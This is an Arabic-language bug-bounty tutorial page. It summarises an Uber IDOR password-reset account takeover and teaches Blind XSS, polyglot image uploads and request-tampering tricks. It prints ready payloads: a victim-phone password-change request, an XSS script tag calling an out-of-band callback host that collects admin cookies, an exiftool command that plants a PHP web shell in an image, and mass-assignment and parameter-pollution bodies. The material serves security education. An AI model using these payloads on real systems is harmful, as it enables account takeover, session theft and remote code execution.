UBER
#143717
Change any Uber user's password via /rt/users/passwordless-signup
💰 $10,000 CRITICAL — ATO 277 upvotes HackerOne
▼
ملخص الثغرة
الباحث mongo (Mongobug) اكتشف إن الـ endpoint /rt/users/passwordless-signup في Uber يقبل رقم هاتف أي مستخدم ويسمح بتغيير كلمة مروره — بدون أي تحقق من الـ session أو الـ ownership. بمجرد معرفة رقم هاتف الضحية (سهل الحصول عليه)، يمكن الاستيلاء على حسابه كاملاً.
خطوات الاستغلال
  1. سجّل حساب Uber وافتح DevTools Network
  2. ابحث عن endpoint يستخدم phone number كـ identifier
  3. في Tamper Dev، غيّر phone_number بـ رقم ضحية أخرى
  4. أرسل الـ request — الـ server قبل تغيير الـ password!
  5. IDOR مش بس بـ id رقمي — أي identifier فريد يصلح
# Original Request POST /rt/users/passwordless-signup {"phoneNumber": "+1YOUR_PHONE", "newPassword": "test123"} # IDOR — رقم هاتف الضحية {"phoneNumber": "+1VICTIM_PHONE", "newPassword": "hacked123"} ← Server accepted = Account Takeover!
الدرس الأهم
💡 الـ IDOR مش بس id=1,2,3 — email, phone, username, account_number كلها تصلح كـ IDOR identifier. جرّبها كلها.

Blind XSS — ما هو
Blind XSS هو Stored XSS لكن الـ payload يُنفَّذ في مكان لا تراه (مثل Admin Panel أو internal tool). تكتشفه فقط عبر Out-of-Band callback.
# Blind XSS Payload <script src="https://your-xss-hunter.com/PAYLOAD"></script> # عند تنفيذه في أي admin page → تستقبل notification # تحتوي: cookies, URL, screenshot, DOM كامل
كيف تختبر Blind XSS من الموبايل
  1. سجّل في XSS Hunter (xsshunter.trufflesecurity.com) واحصل على payload
  2. ضع الـ payload في أي حقل يصل للـ admin: support tickets, app names, feedback forms
  3. انتظر — إذا وصل admin للصفحة → تستقبل email/notification
  4. الـ notification تحتوي URL الـ admin page، cookies، وscreenshot!

HIGHBug Bounty Writeups — insecrez GitHub

الـ Polyglot Attack
ملف PNG صالح ومقبول كصورة، لكن يحتوي PHP code مخفي في الـ metadata. إذا خُزِّن الملف في مكان يمكن تنفيذه، تُنفَّذ الـ PHP.
# إضافة PHP code في EXIF metadata exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg # ثم إعادة تسميته لـ image.php أو image.jpg.php # الصورة تبدو طبيعية لكن تُنفَّذ كـ PHP!
اختبار File Upload من الموبایل
  1. ارفع صورة JPG عادية وسجّل الـ request في Tamper Dev
  2. غيّر filename لـ shell.php وأبقِ Content-Type: image/jpeg
  3. محتوى الملف: <?php echo "TEST"; ?>
  4. إذا قُبل، ابحث عن URL الملف في الـ response
  5. افتح الـ URL — هل ظهر "TEST"؟ → RCE!
  6. جرّب extensions أخرى: .php5, .phtml, .phar, .PHP

Tricks & Advanced Techniques
Chaining · WAF Bypass · Smart Hunting Tips
🔗 Vulnerability Chaining — الـ Trick الأقوى
ثغرة واحدة P4 = $50. نفس الثغرة مع chain = $5,000+.

أمثلة ناجحة:
• Self-XSS + Login CSRF = ATO ($62,500 في Facebook)
• Open Redirect + SSRF = Internal Access
• IDOR + PII = Critical بدل Low
• XSS + CSRF = Account Takeover
• Race Condition + Business Logic = Unlimited Money

كيف تفكر في الـ Chain: بعد كل bug تجده اسأل: "ماذا لو دمجت هذا مع X؟"
🔍 ابحث في Subdomains — 90% من الـ Bugs هناك
الـ main domain محمي ومُختبَر كثيراً. الـ subdomains غالباً مهملة.

ابحث عن: dev., stage., beta., api., m., shop., partners., developer., internal.

من الموبايل: crt.sh/?q=*.target.com لرؤية كل الـ subdomains في certificate transparency logs.
📂 JavaScript Files — كنز مخفي
JavaScript files تحتوي على:
• API endpoints مخفية
• Access tokens أو API keys
• Comments تكشف logic داخلي
• Environment variables

من الموبايل: DevTools → Sources → ابحث عن .js files الكبيرة → Ctrl+F للبحث عن: api, endpoint, token, key, secret, password.
🔄 HTTP Method Tampering
الـ endpoint يرفض GET لكن يقبل POST؟ أو العكس؟

# جرّب كل method على كل endpoint GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD # وأيضاً headers: X-HTTP-Method-Override: DELETE X-Method-Override: PUT
📋 Parameter Pollution
إرسال نفس الـ parameter أكثر من مرة يُربك الـ server.
# أيهما يأخذ الـ server؟ POST /transfer?amount=100&amount=0.01 # بعض الـ frameworks تأخذ الأول، بعضها الأخير # في JSON {"role":"user","role":"admin"}
🕵️ Wayback Machine للـ Old Endpoints
web.archive.org يحتفظ بنسخ قديمة من الموقع تحتوي على endpoints محذوفة قد تكون لا تزال تعمل!

من الموبايل: web.archive.org/web/*/target.com/api/* لرؤية كل الـ API endpoints القديمة.
🔢 Mass Assignment Attack
عند PUT/POST لتحديث بيانات، جرّب إضافة fields غير متوقعة:
# طبيعي {"name": "John", "email": "[email protected]"} # Mass Assignment {"name": "John", "email": "[email protected]", "role": "admin", "isVerified": true, "credits": 99999, "isAdmin": true, "subscription": "premium"}
